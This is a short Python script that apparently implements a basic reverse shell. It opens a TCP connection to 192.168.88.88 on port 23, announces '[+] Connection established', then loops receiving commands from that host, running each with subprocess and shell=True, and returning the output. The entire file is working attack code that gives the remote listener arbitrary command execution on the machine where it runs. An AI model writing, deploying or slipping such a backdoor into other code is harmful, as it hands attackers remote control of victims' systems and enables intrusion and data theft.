import socket
import subprocess

def ejecutar_commando(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.88.88",23))

connection.send(b"\n[+] Connection established.\n")

while True:
    command = connection.recv(1024)
    command_result = ejecutar_commando(command)
    connection.send(command_result)

connection.close()